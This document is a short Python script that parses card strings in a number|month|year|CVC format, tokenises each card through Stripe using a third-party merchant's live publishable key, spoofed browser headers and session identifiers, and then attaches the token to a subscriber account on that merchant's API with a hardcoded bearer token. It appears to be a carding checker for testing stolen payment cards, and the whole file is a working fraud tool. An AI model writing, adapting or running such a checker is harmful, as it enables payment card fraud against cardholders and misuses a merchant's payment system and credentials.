import requests,re
from fake_useragent import UserAgent
ua = UserAgent()
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()
  user_agent = ua.random
  url = "https://api.stripe.com/v1/tokens"

  payload = {
    'guid': "b2baf80b-5b46-433b-9b3e-f4913a8b9549eb9017",
    'muid': "36647e05-981d-4fd0-8ec6-e10a7d8c6cbe8f3c33",
    'sid': "39a0de6c-0273-4e7a-b6e2-902d1b91aeaea7e740",
    'referrer': "https://roamilo.com",
    'time_on_page': "21996",
    'card[name]': "aliggjohh",
    'card[number]': n,
    'card[cvc]': cvc,
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'payment_user_agent': "stripe.js/5cceeecc6c; stripe-js-v3/5cceeecc6c; card-element",
    'pasted_fields': "number",
    'key': "pk_live_51PE7nGLQnxDNbhLb9v2FASnQFwoYJwbs7LKBdCJls8T8tz7JTVoAD6Mqt23Tpxbjh7Oxibwc9Za79rkqwlkgUG1W00KAzaNVfq"
  }

  headers = {
    'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
    'Accept': "application/json",
    'sec-fetch-site': "same-site",
    'origin': "https://js.stripe.com",
    'sec-fetch-mode': "cors",
    'referer': "https://js.stripe.com/",
    'sec-fetch-dest': "empty",
    'accept-language': "en-US,en;q=0.9",
    'priority': "u=3, i"
  }

  response = requests.post(url, data=payload, headers=headers)

  id2=(response.json()['id'])


  import requests
  import json

  url = "https://roamilo.api.lifeline.mobi/subscriber/payment_method"

  payload = {
    "cardToken": id2
  }

  headers = {
    'User-Agent': "Mozilla/5.0 (iPhone; CPU iPhone OS 18_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.4 Mobile/15E148 Safari/604.1",
    'Accept': "application/json, text/plain, */*",
    'Content-Type': "application/json",
    'sec-fetch-site': "cross-site",
    'origin': "https://roamilo.com",
    'sec-fetch-mode': "cors",
    'referer': "https://roamilo.com/",
    'sec-fetch-dest': "empty",
    'authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIwZTMxNjg2ZS1lYjBlLTQwNjUtYmU2MC04M2Q3NjgyZWQwYTIiLCJ1YSI6Ik1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMThfNCBsaWtlIE1hYyBPUyBYKSBBcHBsZVdlYktpdC82MDUuMS4xNSAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vMTguNCBNb2JpbGUvMTVFMTQ4IFNhZmFyaS82MDQuMSIsImlwIjoiMTg1LjE4Ny4xMzEuMTU2IiwicHdoIjpudWxsLCJ0eXAiOiJzdWJzY3JpYmVyIiwiaWF0IjoxNzQ4MDAxNTYzLCJleHAiOjE3NDgwMDUxNjN9.MNKaX-k8lWkFSYYhM9rKlcay703eOOFmDeSCd_juaYE",
    'accept-language': "en-US,en;q=0.9",
    'priority': "u=3, i"
  }

  r2 = requests.post(url, data=json.dumps(payload), headers=headers)
  return (r2.json())